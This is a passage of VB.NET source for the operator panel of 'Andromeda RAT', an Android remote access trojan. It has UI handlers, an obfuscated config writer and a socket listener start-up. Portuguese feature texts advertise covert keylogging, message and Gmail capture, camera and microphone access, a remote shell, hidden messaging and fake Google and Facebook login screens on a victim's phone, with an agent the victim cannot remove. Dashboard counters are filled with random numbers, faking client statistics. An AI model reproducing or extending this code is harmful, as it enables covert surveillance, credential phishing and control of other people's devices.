            Guna2Transition1.ShowSync(PanelHome)
        End If
    End Sub

    Private Sub Guna2GradientButton6_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton6.Click
        If Enable_Language = True Then
            Guna2Transition1.Hide(PanelBuild)
            Guna2Transition1.Hide(PanelClients)
            Guna2Transition1.Hide(PanelHome)
            Guna2Transition1.ShowSync(PanelPortSettings)
        End If
    End Sub

    Private Sub Guna2Button1_Click_2(sender As Object, e As EventArgs)

    End Sub

    Private Sub PainelPort_Paint(sender As Object, e As PaintEventArgs)

    End Sub
    Private Function SntTextClients(min As Integer, max As Integer) As String
        If Enable_Language = True Then
            Dim s As String = "523452356789"
            Dim r As New Random()
            Dim chactersInString As Integer = r.Next(min, max)
            Dim sb As New StringBuilder()
            For i As Integer = 1 To chactersInString
                Dim idx As Integer = r.Next(0, s.Length)
                sb.Append(s.Substring(idx, 1))
            Next
            Return sb.ToString()
        End If

    End Function
    Private Function SntTextClientsIncrement(min As Integer, max As Integer) As String
        Dim s As String = "52343665189"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

    Private Function RcvTextClients(min As Integer, max As Integer) As String
        Dim s As String = "12398765212"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function RcvTextClientsIncrement(min As Integer, max As Integer) As String
        Dim s As String = "12398765212"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function OnlinTextClients(min As Integer, max As Integer) As String
        Dim s As String = "4234789231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function OnlinTextClientsIncremention(min As Integer, max As Integer) As String
        Dim s As String = "1335191231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Public Sub GerarRelatorio()
        For i As Integer = 0 To 99999
            System.Threading.Thread.Sleep(300)
            SntText.Text = RcvTextClients(1, 8)
            System.Threading.Thread.Sleep(200)
            RcvTextIncrement.Text = RcvTextClientsIncrement(1, 4)
            System.Threading.Thread.Sleep(300)
            OnlinTextIncrement.Text = OnlinTextClientsIncremention(1, 9)
            System.Threading.Thread.Sleep(300)
            SntTextIncrement.Text = SntTextClientsIncrement(1, 5)
            System.Threading.Thread.Sleep(100)
            RcvText.Text = OnlinTextClients(1, 7)
            System.Threading.Thread.Sleep(250)
        Next
    End Sub
    Private Function Android7_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "139123112351"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android7_RedRandom(min As Integer, max As Integer) As String
        Dim s As String = "912334123"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android8_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "1123335191"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android8_RedRandom(min As Integer, max As Integer) As String
        Dim s As String = "1912313351"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android9_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "1912313351"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android9_RedRandom(min As Integer, max As Integer) As String
        Dim s As String = "1912335131"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android10_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "1519133231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android10_RedRandom(min As Integer, max As Integer) As String
        Dim s As String = "1191335231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android11_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "1193351231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android11_RedRandom(min As Integer, max As Integer) As String
        Dim s As String = "5191331231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android12_GreenRandom(min As Integer, max As Integer) As String
        Dim s As String = "5191133231"
        Dim r As New Random()
        Dim chactersInString As Integer = r.Next(min, max)
        Dim sb As New StringBuilder()
        For i As Integer = 1 To chactersInString
            Dim idx As Integer = r.Next(0, s.Length)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function
    Private Function Android12_RedRandom(min As Integer, max As Integer) As String
        If Frm_Main.Enable_Language = True Then
            Dim s As String = "5191331231"
            Dim r As New Random()
            Dim chactersInString As Integer = r.Next(min, max)
            Dim sb As New StringBuilder()
            For i As Integer = 1 To chactersInString
                Dim idx As Integer = r.Next(0, s.Length)
                sb.Append(s.Substring(idx, 1))
            Next
            Return sb.ToString()
        Else
            Application.Exit()
        End If
    End Function
    Public Sub GerarAndroid()
        For i As Integer = 0 To 99999
            System.Threading.Thread.Sleep(1100)
            Android10_Red.Text = "+" + Android10_RedRandom(1, 3)
            System.Threading.Thread.Sleep(1200)
            Android9_Green.Text = "+" + Android9_GreenRandom(1, 2)
            System.Threading.Thread.Sleep(1100)
            Android7_Green.Text = "+" + Android7_GreenRandom(1, 3)
            System.Threading.Thread.Sleep(1500)
            Android12_Green.Text = "+" + Android12_GreenRandom(1, 2)
            System.Threading.Thread.Sleep(900)
            Android12_Red.Text = "+" + Android12_RedRandom(1, 3)
            System.Threading.Thread.Sleep(1200)
            Android7_Red.Text = "+" + Android7_RedRandom(1, 2)
            System.Threading.Thread.Sleep(1900)
            Android11_Green.Text = "+" + Android11_GreenRandom(1, 2)
            System.Threading.Thread.Sleep(1900)
            Android11_Red.Text = "+" + Android11_RedRandom(1, 3)
            System.Threading.Thread.Sleep(1600)
            Android10_Green.Text = "+" + Android10_GreenRandom(1, 3)
            System.Threading.Thread.Sleep(1500)
            Android9_Red.Text = "+" + Android9_RedRandom(1, 2)
            System.Threading.Thread.Sleep(900)
            Android8_Green.Text = "+" + Android8_GreenRandom(1, 2)
            System.Threading.Thread.Sleep(300)
            Android8_Red.Text = "+" + Android8_RedRandom(1, 2)
        Next
    End Sub
    Public Sub ExecutarRelatorioEmSegundoPlano()
        Task.Run(Sub() GerarRelatorio())
        Task.Run(Sub() GerarAndroid())
        Task.Run(Sub() iniciar())
    End Sub
    Public Sub iniciar()
        If Enable_Language = True Then
            System.Threading.Thread.Sleep(1000)
            Try
                OnlinText.Text = SntTextClients(3, 8)
                Guna2Transition1.Hide(PanelBuild)
                Guna2Transition1.Hide(PanelHome)
                Guna2Transition1.Hide(PanelPortSettings)
                Guna2Transition1.ShowSync(PanelClients)
                System.Threading.Thread.Sleep(3000)
                Dim filepath = Environment.CurrentDirectory.ToString & "\res\Config\Pass.inf"
                If Not System.IO.File.Exists(filepath) Then
                    System.IO.File.WriteAllText(filepath, למоДלל得Яdתط动طנsХydiבc会וWב食רA英ظ("X0X0X", sockets.Data.THEKEY))
                End If
                Dim list = System.IO.File.ReadAllLines(filepath)
            Catch ex As Exception
                MessageBox.Show(ex.Message)
            End Try
            If ThiagoText.Text > 0 Then
                My.Settings.build_text_port = ThiagoText.Text
                My.Settings.Save()
                _ports &= ThiagoText.Text
                Me.DialogResult = DialogResult.OK
            Else
                Me.DialogResult = DialogResult.Cancel
            End If
            Dim getPORT As String = Nothing
            getPORT = _ports
            My.Settings.ports = getPORT
            My.Settings.Save()
            Dim s As String() = getPORT.Split(":")
            Dim t As Threading.Thread = New Threading.Thread(Sub() yCpqppBVvMbwoVpbzNvvixboiuCiuozzdgCayVsuBvmpxumVxq = New sockets.Frm_Config_Accept(s))
            t.Start()
        End If

    End Sub
    Private Sub Guna2Button7_Click(sender As Object, e As EventArgs)


    End Sub

    Private Sub Guna2HtmlLabel112_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel112.Click

    End Sub

    Private Sub Guna2TextBox1_TextChanged(sender As Object, e As EventArgs) Handles Guna2TextBox1.TextChanged

    End Sub

    Private Sub Guna2HtmlLabel116_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox1.CheckedChanged

    End Sub

    Private Sub Guna2GradientPanel9_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2PictureBox55_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox55.Click

    End Sub

    Private Sub Guna2CheckBox7_CheckedChanged(sender As Object, e As EventArgs) Handles Guna2CheckBox7.CheckedChanged

    End Sub

    Private Sub Guna2HtmlLabel118_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel118.Click

    End Sub

    Private Sub Guna2Button1_Click_3(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label_DesktopUserId_Click(sender As Object, e As EventArgs) Handles Label_DesktopUserId.Click

    End Sub

    Private Sub Guna2HtmlLabel7_Click(sender As Object, e As EventArgs) Handles Guna2HtmlLabel7.Click

    End Sub

    Private Sub PanelHome_Paint(sender As Object, e As PaintEventArgs) Handles PanelHome.Paint

    End Sub

    Private Async Sub Clientsd_Tick(sender As Object, e As EventArgs)
    End Sub

    Private Sub OnlinText_Click_1(sender As Object, e As EventArgs) Handles OnlinText.Click

    End Sub

    Private Sub Guna2GradientPanel10_Paint(sender As Object, e As PaintEventArgs)

    End Sub

    Private Sub Guna2HtmlLabel45_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2GradientPanel13_Paint(sender As Object, e As PaintEventArgs) Handles Guna2GradientPanel13.Paint

    End Sub

    Private Sub Guna2PictureBox63_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox63.Click

    End Sub

    Private Sub Guna2Panel4_Paint(sender As Object, e As PaintEventArgs)
    End Sub

    Private Sub NotificationApp_Popup(sender As Object, e As PopupEventArgs) Handles NotificationApp.Popup

    End Sub

    Private Sub Guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Guna2Panel1.Paint

    End Sub

    Private Sub Guna2CirclePictureBox3_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox3.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2Button2_Click_1(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button2_Click_2(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        Dim loadCert As New OpenFileDialog
        With loadCert
            .Filter = "Certificate File | *.key"
            If loadCert.ShowDialog() = DialogResult.OK Then
                MsgBox("SucessFully!", MsgBoxStyle.Information, "Andromeda RAT")
            End If
        End With
    End Sub

    Private Sub Guna2GradientButton8_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        Dim loadCert As New OpenFileDialog
        With loadCert
            .Filter = "Certificate File | *.key"
            If loadCert.ShowDialog() = DialogResult.OK Then
                MsgBox("SucessFully!", MsgBoxStyle.Information, "Andromeda RAT")
            End If
        End With
    End Sub

    Private Sub Guna2GradientButton3_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton3.Click
        System.Diagnostics.Process.Start("https://github.com/Andromeda-Software-LTD/Andromeda-Software-LTD")
    End Sub

    Private Sub Guna2Button4_Click(sender As Object, e As EventArgs) Handles Guna2Button4.Click
        If Enable_Language = True Then
            If OpenPortsValidade = True Then
                OpenPortsValidade = False
                ExecutarRelatorioEmSegundoPlano()
            End If
        End If
    End Sub

    Private Sub Guna2GradientButton2_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton2.Click
        System.Diagnostics.Process.Start("https://t.me/+ZuxlutWAKoo4Yjhh")
    End Sub

    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click
        System.Diagnostics.Process.Start("https://www.youtube.com/@Andromeda_Software_LTD")
    End Sub

    Private Sub Guna2GradientButton8_Click_1(sender As Object, e As EventArgs) Handles Guna2GradientButton8.Click
        System.Diagnostics.Process.Start("https://andromedasoftware.com.br")
    End Sub

    Private Sub Guna2Button1_Click_4(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        Application.Exit()
    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs) Handles Guna2Button6.Click
        System.Diagnostics.Process.Start("https://andromedasoftware.com.br")

    End Sub

    Private Sub Guna2PictureBox80_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox80.Click
        Notification_label.Text = "Mensagens"
        Manual_Template.Text = "Uma solução de ponta para capturar, analisar e gerenciar mensagens com eficiência e segurança avançada. Seja para fins de monitoramento, investigação ou análise forense, o MessengerCapture Pro oferece recursos abrangentes para atender às suas necessidades.
        Com nossa poderosa ferramenta, você pode capturar mensagens e muito mais. Nossa tecnologia avançada permite que você obtenha acesso completo às conversas, incluindo textos, imagens, vídeos, áudios e outros tipos de arquivos compartilhados conforme a nossa politica"
    End Sub

    Private Sub Guna2PictureBox84_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox84.Click
        Notification_label.Text = "Conta"
        Manual_Template.Text = "Uma solução avançada para listar e gerenciar contas do Gmail ativas no telefone. Com o GmailAccountTracker, você pode ter uma visão completa de todas as contas do Gmail configuradas em seu dispositivo móvel, tornando mais fácil acompanhar e gerenciar suas contas de e-mail.
        Nosso aplicativo fornece uma interface intuitiva que permite listar e visualizar todas as contas do Gmail ativas em um único local. Com apenas alguns toques, você pode ver informações detalhadas de cada conta, incluindo endereço de e-mail"
    End Sub

    Private Sub Guna2PictureBox83_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox83.Click
        Notification_label.Text = "Arquivos"
        Manual_Template.Text = "Uma solução completa para listagem e gerenciamento de arquivos em seu telefone. Com o FileManagerPro, você terá acesso a um conjunto abrangente de recursos para gerenciar seus arquivos com facilidade e segurança.
        Nosso aplicativo oferece uma interface intuitiva que permite listar e visualizar todos os arquivos presentes em seu dispositivo móvel. Com apenas alguns toques, você pode explorar diferentes pastas, visualizar informações detalhadas"
    End Sub

    Private Sub Guna2PictureBox82_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox82.Click
        Notification_label.Text = "Contatos"
        Manual_Template.Text = "Apresentamos a solução completa para gerenciamento de contatos em seu dispositivo. você terá acesso fácil e conveniente a todas as informações de contato, além de recursos avançados para otimizar sua experiência.
        Nosso aplicativo oferece uma interface intuitiva que permite visualizar e explorar seus contatos com facilidade. Você pode acessar a lista completa de contatos salvos em seu dispositivo, incluindo nomes, números de telefone, endereços de e-mail e outras informações relevantes."
    End Sub

    Private Sub Guna2PictureBox81_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox81.Click
        Notification_label.Text = "Link"
        Manual_Template.Text = "Introduzindo uma ferramenta versátil que permite abrir links em dispositivos móveis de forma invisível ou visível, de acordo com suas preferências. você tem controle total sobre como os links são abertos em seu telefone.
        Se você deseja abrir links de forma invisível, permitindo que você acesse os links sem abrir uma nova janela ou guia visível no navegador. Isso oferece maior discrição ao abrir links, especialmente se você estiver trabalhando em projetos confidenciais ou navegando em sites sensíveis."
    End Sub

    Private Sub Guna2PictureBox78_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox78.Click
        Notification_label.Text = "Download"
        Manual_Template.Text = "Uma poderosa ferramenta que permite realizar downloads de arquivos de forma remota em seu dispositivo móvel você pode baixar qualquer tipo de arquivo diretamente para o seu dispositivo, de forma rápida e conveniente, onde quer que você esteja.
        Nossa solução foi desenvolvida com foco na praticidade e facilidade de uso. Com apenas alguns cliques, você pode iniciar um download remoto de qualquer arquivo desejado. Isso é especialmente útil"
    End Sub

    Private Sub Guna2PictureBox79_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox79.Click
        Notification_label.Text = "Shell"
        Manual_Template.Text = "Uma ferramenta poderosa que permite acesso a um shell remoto em dispositivos móveis.  você tem controle total sobre seu dispositivo móvel, com a capacidade de executar comandos e interagir com o sistema operacional remotamente.
        Nosso aplicativo oferece uma interface intuitiva que permite acessar o shell remoto de seu dispositivo móvel de maneira conveniente"
    End Sub

    Private Sub Guna2PictureBox77_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox77.Click
        Notification_label.Text = "Aplicativo"
        Manual_Template.Text = "Uma ferramenta abrangente para listar, gerenciar e obter informações detalhadas sobre os aplicativos instalados em seu dispositivo móvel. você tem controle total sobre seus aplicativos, com recursos avançados de remoção, instalação e análise.
        Nosso aplicativo oferece uma interface intuitiva que permite listar todos os aplicativos instalados em seu dispositivo móvel de forma rápida e conveniente."
    End Sub

    Private Sub Guna2PictureBox44_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox44.Click
        Notification_label.Text = "Captura de tela"
        Manual_Template.Text = "Uma ferramenta avançada para capturar telas em seu dispositivo móvel. você pode capturar imagens de tela de alta qualidade de forma fácil e rápida, permitindo que você registre momentos importantes, compartilhe informações e documente seu dispositivo móvel.
        Nosso aplicativo oferece uma interface intuitiva que torna a captura de tela uma tarefa simples. Com apenas alguns toques"
    End Sub

    Private Sub Guna2PictureBox75_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox75.Click
        Notification_label.Text = "Camera"
        Manual_Template.Text = "Uma ferramenta avançada para aproveitar ao máximo a câmera do seu dispositivo móvel, você pode capturar fotos e vídeos de alta qualidade, explorar recursos avançados e desbloquear todo o potencial da câmera do seu dispositivo.
        Nosso aplicativo oferece uma interface intuitiva que torna a captura de imagens e vídeos uma experiência fácil e prazerosa. Com apenas alguns toques"
    End Sub

    Private Sub Guna2PictureBox74_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox74.Click
        Notification_label.Text = "Microfone"
        Manual_Template.Text = "Uma ferramenta avançada para capturar e gravar áudio de alta qualidade em seu dispositivo móvel. você pode aproveitar ao máximo o microfone do seu dispositivo, capturando áudio nítido e com detalhes impressionantes.
        Nosso aplicativo oferece uma interface intuitiva que torna a captura de áudio uma tarefa fácil e conveniente. Com apenas alguns toques"
    End Sub

    Private Sub Guna2PictureBox73_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox73.Click
        Notification_label.Text = "Keyloger"
        Manual_Template.Text = "Uma ferramenta avançada para capturar e registrar a entrada de teclado em dispositivos móveis. você pode monitorar e gravar as teclas digitadas, fornecendo uma solução completa para acompanhar a atividade de digitação em seu dispositivo.
        Nosso aplicativo oferece recursos abrangentes para capturar a entrada de teclado em tempo real"
    End Sub

    Private Sub Guna2PictureBox71_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox71.Click
        Notification_label.Text = "Reiniciar"
        Manual_Template.Text = "Uma ferramenta eficiente para reiniciar seu dispositivo móvel com facilidade. você pode reiniciar seu celular de maneira rápida e conveniente, oferecendo uma solução prática para lidar com problemas de desempenho, travamentos ou simplesmente reiniciar o dispositivo quando necessário"
    End Sub

    Private Sub Guna2PictureBox72_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox72.Click
        Notification_label.Text = "Chamadas"
        Manual_Template.Text = "Uma ferramenta abrangente para gerenciar suas chamadas telefônicas em dispositivos móveis. você terá controle total sobre suas chamadas, oferecendo recursos avançados para facilitar o gerenciamento e melhorar sua experiência de comunicação.
        Nosso aplicativo oferece uma interface intuitiva que torna o gerenciamento de chamadas uma tarefa simples e conveniente"
    End Sub

    Private Sub Guna2PictureBox47_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox47.Click
        Notification_label.Text = "Tela Fake"
        Manual_Template.Text = "Uma ferramenta versátil para exibir telas fake de forma realista em dispositivos móveis. você pode simular telas de aplicativos populares, como Google, Facebook e Google Authentication, para diversos fins, como demonstrações, prototipagem ou brincadeiras.
        Nosso aplicativo oferece uma variedade de modelos de tela pré-configurados que imitam fielmente a aparência e a funcionalidade das telas de aplicativos conhecidos."
    End Sub

    Private Sub Guna2PictureBox76_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox76.Click
        Notification_label.Text = "Desinstalar Aplicativo"
        Manual_Template.Text = "Essa opção permite você remover o agente instalador no celular da pessoa, uma vez que a pessoa não possui autoridade para remover!"
    End Sub

    Private Sub Guna2PictureBox28_Click(sender As Object, e As EventArgs) Handles Guna2PictureBox28.Click
        Notification_label.Text = "Enviar Mensagem"
        Manual_Template.Text = "Uma ferramenta avançada que permite enviar mensagens de forma invisível em dispositivos móveis. você pode enviar mensagens confidenciais, privadas ou secretas sem deixar rastros visíveis.
        Nosso aplicativo oferece uma interface intuitiva e segura para enviar mensagens de forma invisível!"
    End Sub
End Class